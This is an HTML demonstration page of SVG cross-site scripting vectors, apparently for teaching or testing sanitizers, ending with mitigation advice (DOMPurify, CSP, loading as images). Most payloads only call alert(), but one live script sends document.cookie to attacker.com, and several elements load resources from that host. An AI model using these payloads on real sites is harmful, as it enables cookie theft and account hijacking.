<!doctype html>
<html>

<head>
  <meta charset="utf-8">
  <title>SVG with XSS</title>
</head>

<body>
  <section>
    <h2>Script tag</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <script>
        alert("This is a malicious script!");
        // This script could do more dangerous things, like stealing cookies
        // For example:
        fetch("https://attacker.com/steal?data=" + document.cookie);
      </script>
      <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red" />
    </svg>
  </section>
  <section>
    <h2>Event handlers</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <circle cx="50" cy="50" r="40" stroke="black" stroke-width="3" fill="red"
        onmouseover="alert('Hovered over the circle!')" />
    </svg>
  </section>
  <section>
    <h2>External resource loading</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <image href="https://attacker.com/tracker.png" width="100" height="100" />
    </svg>
  </section>
  <section>
    <h2>Data URLs with JavaScript</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <image
        href="data:image/svg+xml,<svg xmlns='http://www.w3.org/2000/svg'><script>alert('Inside Data URL')</script><circle cx='50' cy='50' r='40' stroke='black' stroke-width='3' fill='red' /></svg>" />
    </svg>
  </section>
  <section>
    <h2></h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <style>
        <![CDATA[
          circle { fill: url("https://attacker.com/malicious"); }
        ]]>
      </style>
      <circle cx="50" cy="50" r="40" />
    </svg>
  </section>
  <section>
    <h2>&lt;a&gt; Tags with JavaScript URLs</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <a xlink:href="javascript:alert('Clicked the link!')">
        <text x="10" y="20">Click me</text>
      </a>
    </svg>
  </section>
  <section>
    <h2>Base64-Encoded JavaScript Payloads</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <image href="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciPjxzY3JpcHQ+YWxlcnQoJ1RoaXMgaXMgYmFzZTY0IG1hbGljaW91cycpPC9zY3JpcHQ+PC9zdmc+" />
    </svg>
  </section>
  <section>
    <h2>Inline foreignObject Element for HTML/JavaScript</h2>
    <svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
      <foreignObject x="20" y="20" width="100" height="100">
        <body xmlns="http://www.w3.org/1999/xhtml">
          <script>alert("Malicious foreignObject!");</script>
        </body>
      </foreignObject>
    </svg>
  </section>
  <section>
    <h2>Mitigating The Risks</h2>
    <ol>
      <li>Sanitize SVGs: Use a reliable library like DOMPurify or sanitize-svg to strip out scripts, event handlers, and dangerous attributes before rendering SVGs</li>
      <li>Limit External Resources: Restrict external resource loading and disable the href or xlink:href attributes where possible</li>
      <li>Content Security Policy (CSP): Enforce a CSP to control what content and resources the SVG can load or execute</li>
      <li>Load as imgs instead of svgs whenever possible as that limits script execution</li>
    </ol>
  </section>
</body>

</html>